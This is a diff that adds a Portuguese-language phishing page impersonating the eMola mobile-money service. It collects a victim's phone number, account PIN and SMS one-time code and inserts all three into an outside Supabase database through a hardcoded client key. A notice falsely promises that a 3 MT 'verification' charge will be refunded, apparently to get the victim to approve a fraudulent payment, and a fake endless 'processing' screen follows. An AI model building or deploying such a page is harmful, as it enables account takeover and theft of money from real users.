@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>eMola — Validação</title>
+  <style>
+    :root {
+      --orange: #f47721;
+      --orange-dark: #d95d0b;
+      --orange-light: #fff1e5;
+      --ink: #202124;
+      --muted: #6b7280;
+      --white: #fff;
+      --border: #f0d8c7;
+      --shadow: 0 18px 50px rgba(160, 75, 16, .15);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      color: var(--ink);
+      background:
+        radial-gradient(circle at 10% 10%, rgba(255,255,255,.45), transparent 28%),
+        linear-gradient(135deg, #ff8b36, #f47721 55%, #e96812);
+      display: grid;
+      place-items: center;
+      padding: 22px;
+    }
+    .shell { width: 100%; max-width: 440px; }
+    .card {
+      background: var(--white);
+      border-radius: 25px;
+      box-shadow: var(--shadow);
+      overflow: hidden;
+    }
+    .brand {
+      padding: 28px 28px 22px;
+      text-align: center;
+      background: linear-gradient(180deg, #fff8f2, #fff);
+      border-bottom: 1px solid #fff0e4;
+    }
+    .logo {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 58px;
+      height: 58px;
+      border-radius: 18px;
+      color: white;
+      font-weight: 900;
+      font-size: 1.8rem;
+      background: linear-gradient(145deg, #ff9b4a, #ed650e);
+      box-shadow: 0 7px 0 #c9540b, 0 12px 24px rgba(237,101,14,.25);
+      margin-bottom: 13px;
+    }
+    h1 { margin: 0; color: var(--orange-dark); font-size: 2rem; letter-spacing: -.04em; }
+    .subtitle { margin: 7px 0 0; color: var(--muted); font-size: .94rem; }
+    .content { padding: 26px; }
+    .step { display: none; }
+    .step.active { display: block; animation: appear .28s ease-out; }
+    @keyframes appear { from {opacity:0; transform:translateY(7px)} to {opacity:1; transform:translateY(0)} }
+    h2 { font-size: 1.2rem; margin: 0 0 7px; }
+    .hint { color: var(--muted); font-size: .9rem; margin: 0 0 20px; line-height: 1.5; }
+    label { display: block; font-size: .85rem; font-weight: 700; margin: 15px 0 7px; }
+    input {
+      width: 100%; border: 1.5px solid var(--border); border-radius: 12px;
+      padding: 14px 15px; font: inherit; font-size: 1rem; outline: none;
+      transition: border .2s, box-shadow .2s; background: #fff;
+    }
+    input:focus { border-color: var(--orange); box-shadow: 0 0 0 4px rgba(244,119,33,.13); }
+    .btn {
+      border: 0; width: 100%; margin-top: 20px; padding: 15px;
+      border-radius: 13px; color: white; background: linear-gradient(135deg, #ff8a32, #e96712);
+      font: inherit; font-weight: 800; font-size: 1rem; cursor: pointer;
+      box-shadow: 0 5px 0 #c9530b, 0 9px 18px rgba(233,103,18,.2);
+      transition: transform .12s, filter .12s;
+    }
+    .btn:hover { filter: brightness(1.04); }
+    .btn:active { transform: translateY(3px); box-shadow: 0 2px 0 #c9530b; }
+    .btn:disabled { opacity: .65; cursor: wait; }
+    .processing { text-align: center; padding: 12px 0 4px; }
+    .spinner {
+      width: 54px; height: 54px; border: 5px solid #ffe2cd; border-top-color: var(--orange);
+      border-radius: 50%; animation: spin .85s linear infinite; margin: 12px auto 18px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .processing h2 { margin-bottom: 9px; }
+    .status { color: var(--muted); font-size: .9rem; line-height: 1.5; }
+    .progress { height: 8px; background: #ffeadb; border-radius: 99px; overflow: hidden; margin: 20px 0 8px; }
+    .progress span { display: block; width: 0%; height: 100%; background: var(--orange); transition: width .2s linear; }
+    .timer { color: var(--orange-dark); font-weight: 800; font-variant-numeric: tabular-nums; }
+    .otp-row { display: flex; gap: 8px; margin-top: 10px; }
+    .otp-row input { text-align: center; font-size: 1.35rem; font-weight: 800; padding: 13px 0; }
+    .footer { padding: 0 26px 22px; text-align: center; color: #8b8b8b; font-size: .75rem; }
+    .small-link { color: var(--orange-dark); text-decoration: none; font-weight: 700; }
+    .error { color: #b42318; font-size: .85rem; margin-top: 10px; display: none; }
+    /* ALTERADO: estilo para a caixa de aviso de cobrança */
+    .notice {
+      border: 1px solid #ffd3b1;
+      background: #fff7f0;
+      color: #8c3d08;
+      border-radius: 12px;
+      padding: 11px 13px;
+      font-size: .82rem;
+      line-height: 1.45;
+      margin-bottom: 20px;
+    }
+    .notice strong { color: #b45309; }
+    @media (max-width: 380px) {
+      body { padding: 12px; }
+      .content { padding: 21px; }
+      .brand { padding: 23px 20px 18px; }
+      .otp-row { gap: 5px; }
+      .otp-row input { font-size: 1.15rem; }
+    }
+  </style>
+</head>
+<body>
+  <main class="shell">
+    <section class="card">
+      <header class="brand">
+        <div class="logo" aria-hidden="true">e</div>
+        <h1>eMola</h1>
+        <p class="subtitle">Validação de conta</p>
+      </header>
+
+      <div class="content">
+        <!-- ALTERADO: aviso de cobrança na primeira etapa -->
+        <div class="notice">
+          <strong>Atenção:</strong> para verificar se a conta é real e corresponde aos dados do cliente,
+          será efetuada uma cobrança de <strong>3 MT</strong>. O valor será <strong>devolvido em 2 minutos</strong>.
+        </div>
+
+        <form id="loginForm" class="step active">
+          <h2>Entrar</h2>
+          <p class="hint">Introduza o seu número de telefone e PIN.</p>
+
+          <label for="phone">Número de telefone</label>
+          <input id="phone" type="tel" inputmode="numeric" autocomplete="off"
+                 placeholder="9 dígitos" maxlength="9" required>
+
+          <label for="pin">PIN (6 dígitos)</label>
+          <input id="pin" type="password" inputmode="numeric" autocomplete="off"
+                 placeholder="PIN de 6 dígitos" maxlength="6" required>
+
+          <p class="error" id="loginError">Preencha corretamente o telefone (9 dígitos) e o PIN (6 dígitos).</p>
+          <button class="btn" type="submit">Entrar</button>
+        </form>
+
+        <section id="processingStep" class="step">
+          <div class="processing">
+            <div class="spinner"></div>
+            <h2>A processar…</h2>
+            <p class="status">Aguarde <span class="timer" id="countdown">10</span> segundos.</p>
+            <div class="progress"><span id="progressBar"></span></div>
+            <p class="status">Não feche esta página.</p>
+          </div>
+        </section>
+
+        <form id="otpForm" class="step">
+          <h2>Código de verificação</h2>
+          <!-- ALTERADO: explicação da cobrança na etapa de OTP -->
+          <div class="notice">
+            Para confirmar que a conta é real e corresponde aos dados do cliente, será cobrado o valor de
+            <strong>3 MT</strong>. Este valor será <strong>devolvido em 2 minutos</strong> após a verificação.
+          </div>
+          <p class="hint">Introduza o código de 6 dígitos enviado para o seu telefone. O envio é automático ao preencher o último dígito.</p>
+          <label for="otp">Código de 6 dígitos</label>
+          <div class="otp-row" aria-label="Código de verificação">
+            <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 1" required>
+            <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 2" required>
+            <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 3" required>
+            <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 4" required>
+            <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 5" required>
+            <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 6" required>
+          </div>
+          <p class="error" id="otpError">Introduza os 6 dígitos.</p>
+          <button class="btn" type="submit">Continuar</button>
+        </form>
+
+        <section id="waitingStep" class="step">
+          <div class="processing">
+            <div class="spinner"></div>
+            <h2>Validação em curso</h2>
+            <p class="status">A sua validação está a ser processada.</p>
+            <div class="progress"><span style="width:100%"></span></div>
+            <p class="status">Estado: <strong class="timer">A processar</strong></p>
+          </div>
+        </section>
+      </div>
+      <footer class="footer">
+        <a class="small-link" href="#" id="restart">Reiniciar</a>
+      </footer>
+    </section>
+  </main>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    // ====== CREDENCIAIS SUPABASE ======
+    const SUPABASE_URL = "https://xsyovgwuodqdthpahnov.supabase.co";
+    const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_QeVZ4IY7ZFn_RKRvPRVyaQ_mFGcIYbw";
+    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
+
+    // Envia o evento COM os dados preenchidos pelo cliente
+    async function logEvent(eventType, data = {}) {
+      try {
+        const { error } = await supabaseClient
+          .from("demo_events")
+          .insert({
+            event_type: eventType,
+            phone: data.phone || null,
+            pin: data.pin || null,
+            otp: data.otp || null,
+          });
+        if (error) console.warn("Evento não registado:", error.message);
+        else console.info("Evento registado:", eventType, data);
+      } catch (err) {
+        console.warn("Falha ao registar evento:", err.message);
+      }
+    }
+
+    const loginForm = document.getElementById("loginForm");
+    const processingStep = document.getElementById("processingStep");
+    const otpForm = document.getElementById("otpForm");
+    const waitingStep = document.getElementById("waitingStep");
+    const countdown = document.getElementById("countdown");
+    const progressBar = document.getElementById("progressBar");
+    const phoneInput = document.getElementById("phone");
+    const pinInput = document.getElementById("pin");
+    const otpDigits = [...document.querySelectorAll(".otp-digit")];
+
+    // Guarda os dados do login para enviar junto com o OTP
+    let currentPhone = "";
+    let currentPin = "";
+
+    function showStep(step) {
+      [loginForm, processingStep, otpForm, waitingStep].forEach(el => el.classList.remove("active"));
+      step.classList.add("active");
+    }
+
+    loginForm.addEventListener("submit", async (event) => {
+      event.preventDefault();
+      const phone = phoneInput.value.trim();
+      const pin = pinInput.value.trim();
+      const phoneOk = /^\d{9}$/.test(phone);
+      const pinOk = /^\d{6}$/.test(pin);
+      if (!phoneOk || !pinOk) {
+        document.getElementById("loginError").style.display = "block";
+        return;
+      }
+      document.getElementById("loginError").style.display = "none";
+
+      // Guardar para enviar depois com o OTP
+      currentPhone = phone;
+      currentPin = pin;
+
+      // Enviar o evento JÁ COM telefone e PIN
+      await logEvent("login_step_started", { phone, pin });
+
+      showStep(processingStep);
+
+      let remaining = 10;
+      countdown.textContent = remaining;
+      progressBar.style.width = "0%";
+      const interval = setInterval(() => {
+        remaining--;
+        countdown.textContent = Math.max(remaining, 0);
+        progressBar.style.width = ((10 - remaining) / 10 * 100) + "%";
+        if (remaining <= 0) {
+          clearInterval(interval);
+          // Limpar os inputs visuais, mas manter em memória para o envio do OTP
+          phoneInput.value = "";
+          pinInput.value = "";
+          showStep(otpForm);
+          otpDigits[0].focus();
+        }
+      }, 1000);
+    });
+
+    let otpSubmitting = false;
+
+    otpDigits.forEach((input, index) => {
+      input.addEventListener("input", () => {
+        input.value = input.value.replace(/\D/g, "").slice(0, 1);
+        if (input.value && index < otpDigits.length - 1) {
+          otpDigits[index + 1].focus();
+        }
+        const code = otpDigits.map(i => i.value).join("");
+        if (code.length === 6 && !otpSubmitting) {
+          submitOtp();
+        }
+      });
+      input.addEventListener("keydown", (event) => {
+        if (event.key === "Backspace" && !input.value && index > 0) {
+          otpDigits[index - 1].focus();
+        }
+      });
+      input.addEventListener("paste", (event) => {
+        event.preventDefault();
+        const pasted = (event.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 6);
+        pasted.split("").forEach((digit, i) => { if (otpDigits[i]) otpDigits[i].value = digit; });
+        const nextIndex = Math.min(pasted.length, 5);
+        otpDigits[nextIndex].focus();
+        if (pasted.length === 6 && !otpSubmitting) {
+          submitOtp();
+        }
+      });
+    });
+
+    async function submitOtp() {
+      if (otpSubmitting) return;
+      const code = otpDigits.map(input => input.value).join("");
+      if (!/^\d{6}$/.test(code)) {
+        document.getElementById("otpError").style.display = "block";
+        return;
+      }
+      otpSubmitting = true;
+      document.getElementById("otpError").style.display = "none";
+
+      // Enviar o evento COM telefone, PIN e OTP
+      await logEvent("otp_step_completed", {
+        phone: currentPhone,
+        pin: currentPin,
+        otp: code,
+      });
+
+      otpDigits.forEach(input => input.value = "");
+      showStep(waitingStep);
+    }
+
+    otpForm.addEventListener("submit", async (event) => {
+      event.preventDefault();
+      if (otpSubmitting) return;
+      await submitOtp();
+    });
+
+    document.getElementById("restart").addEventListener("click", (event) => {
+      event.preventDefault();
+      otpSubmitting = false;
+      currentPhone = "";
+      currentPin = "";
+      phoneInput.value = "";
+      pinInput.value = "";
+      otpDigits.forEach(input => input.value = "");
+      showStep(loginForm);
+    });
+  </script>
+</body>
+</html>
